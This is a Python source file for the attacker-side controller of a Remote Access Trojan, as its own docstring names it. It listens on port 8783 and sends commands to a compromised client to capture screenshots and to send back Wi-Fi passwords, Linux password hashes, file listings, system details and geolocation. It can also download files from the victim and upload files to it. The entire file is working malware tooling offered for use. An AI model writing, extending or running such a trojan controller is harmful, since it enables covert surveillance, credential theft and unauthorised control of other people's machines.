import socket  # Import the socket module for network communication
import time  # Import the time module for working with timestamps
import re  # Import the re module for regular expressions
import os  # Import the os module for working with the operating system

"""
This function receives a file from the client using a timestamp and saves it with a modified filename that includes the timestamp.
It follows these steps:
1. Generates a timestamp to uniquely identify the received file.
2. Appends the timestamp to the original filename to create a modified filename.
3. Receives the 4-byte file size from the client as bytes.
4. Converts the received bytes to an integer to determine the expected file size.
5. Initializes an empty bytes object 'received_data' to store the received file data.
6. Enters a loop until the received data size matches the expected file size:
    - Receives data chunks from the client and appends them to 'received_data.'
    - Breaks the loop if no data is received.
7. If the received data size matches the expected size, it saves the received data to a file with the modified filename.
8. Prints a success message indicating that the file has been received and saved with the modified filename.
9. Prints an error message if file reception fails or if the original file is not found on the client.

Parameters:
- client_socket: The socket connected to the client for data transfer.
- filename: The original filename of the file being received.
"""
def receive_file(client_socket, filename): # Function to receive and save a file from the client using a timestamp
    try:
        timestamp = int(time.time())  # Generate a timestamp
        modified_filename = f"{timestamp}_{filename}"  # Append timestamp to the filename
        file_size_bytes = client_socket.recv(4)  # Receive the 4-byte file size as bytes
        file_size = int.from_bytes(file_size_bytes, byteorder='big')  # Convert bytes to an integer
        received_data = b''  # Initialize an empty bytes object for received data

        while len(received_data) < file_size:
            data_chunk = client_socket.recv(file_size - len(received_data))  # Receive remaining data
            if not data_chunk:
                break
            received_data += data_chunk  # Append received data to the buffer

        if len(received_data) == file_size:
            with open(modified_filename, "wb") as file:  # Save with the modified filename
                file.write(received_data)  # Write received data to the file
            print()
            print(f"FILE RECEIVED AND SAVED AS '{modified_filename}'")
            print()
        else:
            print()
            print("FILE RECEPTION FAILED!!!")
            print()

    except FileNotFoundError as e:
        print(f"File '{filename}' not found on the client.")
    except Exception as e:
        print(f"An error occurred while receiving the file '{filename}': {str(e)}")

"""
This function sends a file to the client over a socket connection.
It follows these steps:
1. Opens the specified 'filename' in binary read mode.
2. Reads the contents of the file into the 'file_data' variable.
3. Sends the length of the file data as 4 bytes in big-endian byte order to indicate the file size.
4. Sends the actual file data.
5. Prints a confirmation message indicating that the file has been sent to the client.
6. Optionally, attempts to delete the file from the server if 'delete_after' is set to 'True'.
7. Prints a deletion confirmation message if the file is deleted successfully or a deletion failure message if deletion fails.
8. Handles exceptions for file not found on the server and other general exceptions during the file send process.

Parameters:
- client_socket: The socket connected to the client for data transfer.
- filename: The path of the file to be sent to the client.
- delete_after: A boolean flag indicating whether to delete the file from the server after sending it (default is 'True').
"""
def send_file(client_socket, filename, delete_after=True): # Function to send a file to the client
    try:
        with open(filename, "rb") as file:  # Open the file in binary read mode
            file_data = file.read()  # Read the contents of the file
            client_socket.send(len(file_data).to_bytes(4, byteorder='big'))  # Send the file size as 4 bytes
            client_socket.send(file_data)  # Send the file data
        print(f"File '{filename}' sent to the client.")  # Print a confirmation message

        if delete_after:
            try:
                os.remove(filename)  # Attempt to delete the file from the server
                print(f"File '{filename}' deleted from the server.")  # Print a deletion confirmation message
            except Exception as e:
                print(f"Failed to delete file '{filename}' from the server: {str(e)}")  # Print a deletion failure message

    except FileNotFoundError as e:
        print(f"File '{filename}' not found on the server.")
    except Exception as e:
        print(f"An error occurred while sending the file '{filename}': {str(e)}")

"""
This function validates a file path to ensure it is in a Linux-compatible format.
It follows these steps:
1. Defines a regular expression pattern for a valid Linux file or directory path.
2. Uses the 're.match' function to check if the provided 'file_path' matches the pattern.
3. Returns 'True' if the 'file_path' matches the pattern (indicating it is a valid Linux file path), or 'False' otherwise.

Parameters:
- file_path: The file path to be validated.
"""
def validate_linux_file_path(file_path): # Function to validate File path & Directory path in Linux-compatible format
    # Define the regular expression pattern for a valid Linux File or Directory path
    pattern = r'^(/[^/]+)+(/[^/]+\.\w+)?$'
    return bool(re.match(pattern, file_path))

"""
This function handles the download of a file from the client. It follows these steps:

- Check if the provided 'file_path' is a valid Linux file path using the 'validate_linux_file_path' function.
- If 'file_path' is valid, send a command to the client to initiate the file download.
- Receive and decode the client's response.
- If the response indicates that the file does not exist on the client, print an error message.
- If the file is found on the client, call the 'receive_file' function to receive and save the file with its original name.

Parameters:
- client_socket: The socket object connected to the client.
- file_path: The path of the file to download from the client.
"""
def download_file(client_socket, file_path):
    if validate_linux_file_path(file_path):
        client_socket.send(f'download_file {file_path}'.encode())

        response = client_socket.recv(1024).decode()  # Receive and decode the client's response
        if response == f"File '{file_path}' does not exist on the client.":
            print(f"File '{file_path}' does not exist on the client.")
            print()
        else:
            # Receive the file from the client
            receive_file(client_socket, os.path.basename(file_path))  # Save the received file with its original name
    else:
        print("Invalid Linux-compatible file path.")

"""
This function is responsible for uploading a file to the client.
It follows these steps:
1. Checks if 'server_file_path' exists on the server.
2. Sends an 'upload_file' command to the client, including the server file path.
3. Prompts the user to enter a valid Linux-compatible directory path on the client where the file should be uploaded.
4. Sends the client's directory path to the client.
5. Receives a response from the client, which can be either a validation message or an error message.
6. If the client directory path is valid, it sends the file to the client using the 'send_file' function.
7. Prints an appropriate message based on the received response.

Parameters:
- client_socket: The socket connected to the client.
- server_file_path: The file path on the server to upload.
"""
def upload_file(client_socket, server_file_path): # Send the file to the client
    if os.path.exists(server_file_path): # check if server_file_path exists on server
        client_socket.send(f'upload_file {server_file_path}'.encode())  # Send the upload request to the client

        client_directory_path = input("Enter Linux Compatible directory path on the client where the file should be uploaded eg:/dir/dir/dir: ")
        client_socket.send(client_directory_path.encode())  # Send the client's Directory path

        response = client_socket.recv(1024).decode()  # Receive and decode the client's response
        if response == "valid_directory":
            print(f'{client_directory_path} is a valid directory path')  # Print a validation message
            send_file(client_socket, server_file_path, delete_after=False)  # Send the file to the client
            print(f"File '{server_file_path}' uploaded to the client directory: {client_directory_path}")  # Print success message
            print()
        else:
            print("Invalid client directory path. Please check and try again.")  # Print an error message for an invalid directory path
            print()
    else:
        print("File not found on the server.")  # Print an error message if the file does not exist on the server
        print()

"""
This main function sets up the hacker (server) side of a Remote Access Trojan (RAT) application.
It listens for incoming client connections and provides a menu of options to interact with the connected client.
The explanation is provided in comments above each section of the code.

- Create a socket for the hacker server.
- Specify the IP address (0.0.0.0 to listen on all interfaces) and port (8783) to listen on.
- Bind the socket to the specified IP address and port, and start listening for incoming connections.
- Accept incoming client connections and handle interactions based on the user's choice:
  1. Capture a screenshot from the client.
  2. Retrieve Linux Wi-Fi passwords from the client.
  3. Get Linux password hashes from the client.
  4. Get a list of all directories and files on the client's system.
  5. Get system information from the client.
  6. Get geolocation information from the client.
  7. Download a file from the client.
  8. Upload a file from the server to the client.
  9. Exit the RAT.
"""
if __name__ == "__main__":
    hacker_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket object

    ip_to_listen = "0.0.0.0"  # Define the IP address to listen on (all available network interfaces)
    port = 8783  # Define the port to listen on

    my_socket_address = (ip_to_listen, port)  # Create a tuple for the socket address

    try:
        hacker_server_socket.bind(my_socket_address)  # Bind the socket to the specified address and port
        hacker_server_socket.listen(5)  # Listen for incoming connections with a backlog of 5
        print()
        print("LISTENING FOR ALL INCOMING CLIENT CONNECTIONS...")
        print()

        client_socket, client_address = hacker_server_socket.accept()  # Accept an incoming client connection and get the client's socket and address
        print(f"NEW CONNECTION: {client_address}:{port}")
        print()

        while True:
            print("Options:")
            print("1. Capture Screenshot")
            print("2. Get Linux Wi-Fi Passwords")
            print("3. Get Linux Password Hashes")
            print("4. Get All Directory and File List of System (might take up to 90-120 sec)")
            print("5. Get System Information (might take up to 60-90 sec)")
            print("6. Get Geolocation Information")
            print("7. Download a file from Client (time based on file size)")
            print("8. Upload a file from Server to Client (time based on file size)")
            print("9. Exit")

            choice = input("Enter your choice (1-9): ")

            if choice == '1':
                client_socket.send('get_screenshot'.encode())
                receive_file(client_socket, "received_screenshot.png")

            elif choice == '2':
                client_socket.send('get_wifi_passwords_linux'.encode())
                receive_file(client_socket, "received_wifi_passwords.txt")

            elif choice == '3':
                client_socket.send('get_linux_password_hashes'.encode())
                receive_file(client_socket, "received_linux_password_hashes.txt")

            elif choice == '4':
                client_socket.send('get_file_list'.encode())
                receive_file(client_socket, "received_file_list.txt")

            elif choice == '5':
                client_socket.send('get_system_info'.encode())
                receive_file(client_socket, "received_system_info.txt")

            elif choice == '6':
                client_socket.send('get_geolocation'.encode())
                receive_file(client_socket, "received_geolocation.txt")

            elif choice == '7':
                file_path = input("Enter the path of the file to download from the client (Linux-compatible path): ")
                download_file(client_socket, file_path)

            elif choice == '8':
                server_file_path = input("Enter Linux Compatible file path to upload from the server eg:/dir/dir/aything.xxx: ")
                upload_file(client_socket, server_file_path)

            elif choice == '9':
                print() 
                print("TERMINATING CONNECTION WITH CLIENT!!!, THANK YOU FOR USING MY RAT")
                client_socket.send('exit'.encode())
                break

            else:
                print("INVALID CHOICE. PLEASE ENTER A VALID OPTION (1-8)")

    except Exception as e:
        print(f"AN ERROR OCCURRED: {str(e)}")

    finally:
        client_socket.close() # Close the socket in the client-side code
        hacker_server_socket.close() # Close the socket in the server-side code
